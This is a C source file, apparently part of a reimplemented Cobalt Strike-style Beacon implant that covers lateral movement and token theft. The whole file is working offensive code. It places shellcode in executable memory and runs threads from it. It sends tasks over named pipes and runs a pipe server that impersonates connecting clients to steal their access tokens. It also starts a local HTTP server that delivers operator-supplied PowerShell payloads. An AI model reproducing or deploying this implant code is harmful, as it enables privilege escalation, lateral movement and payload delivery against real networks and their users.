#include "BeaconLateralMovement.h"
#include "common.h"
//#include "c2profile.h"

HANDLE g_hToken;
HANDLE g_hObject;
HANDLE g_hHandle;

int __stdcall sub_1000A6D3(BeaconBackgroundThreads* pBeaconBackgroundThreads)
{
    ((void(__stdcall*)(void*))pBeaconBackgroundThreads->StartAddress)(pBeaconBackgroundThreads);
    pBeaconBackgroundThreads->pVirtualFree(pBeaconBackgroundThreads, 0, MEM_RELEASE);
    return 0;
}

void BeaconNULL1()
{
    return;
}



void* sub_1000520B(size_t shellcodesize, void* shellcode)
{

    int min_alloc = decryptInt(shark_min_alloc);
    if (shellcodesize > min_alloc)
    {
        min_alloc = shellcodesize + 1024;
    }
    int rxw = decryptInt(shark_bofrwx);
    PVOID pshellcode = VirtualAlloc(0, min_alloc, 0x3000u, rxw);
    if (pshellcode)
    {
        memcpy(pshellcode, shellcode, shellcodesize);
        return CheckMemoryRWX(pshellcode, min_alloc) != 0 ? pshellcode : 0;
    }
    else
    {
        BeaconErrorDD(0x1Fu, min_alloc, GetLastError());
        return 0;
    }
}

void sub_1000A6F9()
{
    if (!lpStartAddress)
    {
        lpStartAddress = sub_1000520B((char*)BeaconNULL1 - (char*)sub_1000A6D3, sub_1000A6D3);
    }
}

HANDLE sub_1000A71D(void* plpStartAddress, void* lpParameter)
{

    BeaconBackgroundThreads* pBeaconBackgroundThreads;

    pBeaconBackgroundThreads = (BeaconBackgroundThreads*)VirtualAlloc(0, sizeof(BeaconBackgroundThreads), 0x3000u, 4u);
    pBeaconBackgroundThreads->StartAddress = plpStartAddress;
    pBeaconBackgroundThreads->lpParameter = lpParameter;
    pBeaconBackgroundThreads->pVirtualFree = VirtualFree;
    sub_1000A6F9();
    if (lpStartAddress)
    {
        return CreateThread(0, 0, (LPTHREAD_START_ROUTINE)lpStartAddress, pBeaconBackgroundThreads, 0, 0);
    }
    return (HANDLE)-1;
}

HANDLE BeaconCreateBackgroundThreads(void* lpStartAddress, void* lpParameter)
{
    ++BackgroundThreadsNumber;
    if (decryptInt(shark_CreateBackgroundThreads) == 1)
    {
        return sub_1000A71D(lpStartAddress, lpParameter);
    }
    else
    {
        return CreateThread(0, 0, (LPTHREAD_START_ROUTINE)lpStartAddress, lpParameter, 0, 0);
    }
}

int sub_10005983(char* pipename, HANDLE* hFile)
{
    return ConnectJobPipe(hFile, 0, pipename);
}

void NamedPipesSendData(char* Taskdata, int Task_size)
{

    int timeout = GetTickCount() + 60000;
    datap pdatap;
    BeaconDataParse(&pdatap, Taskdata, Task_size);
    char pipename[132];
    BeaconDataCopyToBuffer(&pdatap, pipename, 128);
    char* databuffer = BeaconDataBuffer(&pdatap);
    int length = BeaconDataLength(&pdatap);
    HANDLE hFile;
    int number=0;
    while (!sub_10005983(pipename, &hFile))
    {
        if (GetLastError() != 53 && GetTickCount() < timeout)
        {
            Sleep(0x3E8u);
            if (++number < 10)
            {
                continue;
            }
        }
        BeaconTaskError1Output(0x32u, GetLastError(), pipename);
        return;
    }
    DWORD NumberOfBytesWritten;
    WriteFile(hFile, &length, 4, &NumberOfBytesWritten, 0);
    int writesize = 0;
    if (length)
    {
        do
        {
            int nNumberOfBytesToWrite = length - writesize;
            if (nNumberOfBytesToWrite > 0x2000)
            {
                nNumberOfBytesToWrite = 0x2000;
            }
            if (!WriteFile(hFile, &databuffer[writesize], nNumberOfBytesToWrite, &NumberOfBytesWritten, 0))
            {
                break;
            }
            writesize = NumberOfBytesWritten + writesize;
        } while (writesize < length);
    }
    FlushFileBuffers(hFile);
    DisconnectNamedPipe(hFile);
    CloseHandle(hFile);
    Sleep(0x3E8u);
}


BeaconMiniHttp* InitMiniHttp(size_t size, SOCKET socket, void* data)
{

    BeaconMiniHttp* pBeaconMiniHttp = (BeaconMiniHttp*)malloc(sizeof(BeaconMiniHttp));
    pBeaconMiniHttp->socket = socket;
    char* payload = (char*)malloc(size);
    memcpy(payload, data,size);
    pBeaconMiniHttp->payload = payload;
    pBeaconMiniHttp->payloadsize = size;

    char* httpheader = (char*)malloc(0x100u);
    pBeaconMiniHttp->httpheader = httpheader;
    _snprintf(
        httpheader,
        0x100,
        "HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: %d\r\n\r\n",
        size);

    pBeaconMiniHttp->httpheadersize = strlen(httpheader);
    pBeaconMiniHttp->rvcedata = (char*)malloc(0x800u);
    return pBeaconMiniHttp;
}

void BeaconMiniHttpFree(BeaconMiniHttp* pBeaconMiniHttp)
{
    closesocket(pBeaconMiniHttp->socket);
    free(pBeaconMiniHttp->payload);
    free(pBeaconMiniHttp->rvcedata);
    free(pBeaconMiniHttp->httpheader);
    free(pBeaconMiniHttp);
}

unsigned int sub_1000AE98(char* buffer, SOCKET s)
{
    int size = 0;
    while (1)
    {
        int recvsize = recv(s, &buffer[size], 1, 0);
        if (recvsize <= 0)
        {
            return -1;
        }
        size += recvsize;
        if (size >= 2 && buffer[size - 1] == 10 && buffer[size - 2] == 13)
        {
            break;
        }
        if (size >= 0x800)
        {
            return -1;
        }
    }
    buffer[size - 2] = 0;
    return size;
}

void __stdcall StartMiniHttpThread(BeaconMiniHttp* pBeaconMiniHttp)
{
    
    SOCKET S = accept(pBeaconMiniHttp->socket, 0, 0);
    if (S == -1)
    {
        BeaconMiniHttpFree(pBeaconMiniHttp);
    }
    else
    {
        while (sub_1000AE98(pBeaconMiniHttp->rvcedata, S) > 2)
        {
            ;
        }
        send(S, pBeaconMiniHttp->httpheader, pBeaconMiniHttp->httpheadersize, 0);
        send(S, pBeaconMiniHttp->payload, pBeaconMiniHttp->payloadsize, 0);
        BeaconMiniHttpFree(pBeaconMiniHttp);
        closesocket(S);
    }
    --BackgroundThreadsNumber;
}

void StartHttpWebDelivery(size_t len, u_short port, char* data)
{

	sockaddr_in name;

    init_socket_options();
    SOCKET s = socket(2, 1, 0);
    if (s == -1)
    {
        closesocket(0xFFFFFFFF);
    }
    else
    {
		name.sin_family = AF_INET;
		name.sin_addr.s_addr = inet_addr("127.0.0.1");
		name.sin_port = htons(port);

        if (bind(s, (SOCKADDR *)&name, sizeof(sockaddr_in)) == -1 || listen(s, 120) == -1)
        {
            closesocket(s);
        }
        else
        {
            //开启一个http
            BeaconMiniHttp* pBeaconMiniHttp = InitMiniHttp(len, s, data);
            BeaconCreateBackgroundThreads(StartMiniHttpThread, pBeaconMiniHttp);
        }
    }
}

void ScriptCradle(char* Taskdata, int Task_size)
{
    datap pdatap;
    BeaconDataParse(&pdatap, Taskdata, Task_size);
    short randomPort =BeaconDataShort(&pdatap);
    int szie = BeaconDataLength(&pdatap);
    char* powershellscript = (char*)BeaconDataBuffer(&pdatap);
    return StartHttpWebDelivery(szie, randomPort, powershellscript);
}


DWORD __stdcall StartNamedPipeThread()
{

    char Buffer[128] = {0};
    DWORD NumberOfBytesRead = 0;
    while (!ConnectNamedPipe(g_hObject, 0) && GetLastError() != 535)
    {
        ;
    }
    if (ReadFile(g_hObject, Buffer, 1u, &NumberOfBytesRead, 0))
    {
        if (ImpersonateNamedPipeClient(g_hObject))
        {
            if (OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, 0, &g_hToken))
            {
                if (g_hObject)
                {
                    DisconnectNamedPipe(g_hObject);
                    CloseHandle(g_hObject);
                }
            }
        }
    }
    --BackgroundThreadsNumber;
    return 0;
}

//************************************
// Method:    StartNamedPipeReceiveData
// FullName:  StartNamedPipeReceiveData
// Access:    public 
// Returns:   void
// Qualifier:创建一个命名管道准备接收数据
// Parameter: char * Taskdata
// Parameter: int Task_size
//************************************
void StartNamedPipeReceiveData(char* Taskdata, int Task_size)
{
    CHAR Name[260];

    if (Task_size < 256)
    {
        memcpy(Name, Taskdata, Task_size);
        g_hToken = (HANDLE)-1;
        g_hObject = (HANDLE)-1;
        g_hHandle = (HANDLE)-1;
        Name[Task_size] = 0;
        g_hObject = CreateNamedPipeA(Name, 3, 4, 2, 0, 0, 0, 0);
        if (g_hObject)
        {
            g_hHandle = BeaconCreateBackgroundThreads((LPTHREAD_START_ROUTINE)StartNamedPipeThread, 0);
        }
    }
}

void ImpersonationToken()
{
    char usersid[0x200] = { 0 };

    if (g_hHandle != (HANDLE)-1)
    {
        WaitForSingleObject(g_hHandle, 0x3A98u);
    }
    if (g_hToken == (HANDLE)-1)
    {
        BeaconErrorNA(1u);
    }
    else if (ImpersonateLoggedOnUser(g_hToken))
    {
        pTokenHandle = g_hToken;
        if (get_user_sid(0x200u, g_hToken, usersid))
        {
            BeaconTaskOutput(usersid, strlen(usersid), 0xFu);
        }
    }
    else
    {
        BeaconErrorD(0xCu, GetLastError());
    }
}

/// <summary>
/// powershellpayload与79和37相关
/// </summary>
char* powershellpayload;

void BeaconPowerShellImport(char* Taskdata, int Task_size)
{

    if (powershellpayload)
    {
        free(powershellpayload);
    }
    powershellpayload = (char*)malloc(Task_size + 1);
    memcpy(powershellpayload, Taskdata, Task_size);
    powershellpayload[Task_size] = 0;
}


//************************************
// Method:    BeaconWebDelivery
// FullName:  BeaconWebDelivery
// Access:    public 
// Returns:   void
// Qualifier:通过开启一个http托管文件
// Parameter: char * Taskdata
// Parameter: int Task_size
//************************************
void BeaconWebDelivery(char* Taskdata, int Task_size)
{

    if (powershellpayload)
    {
        datap pdatap;
        BeaconDataParse(&pdatap, Taskdata, Task_size);
        short port = BeaconDataShort(&pdatap);
        StartHttpWebDelivery(strlen(powershellpayload), port, powershellpayload);
    }
}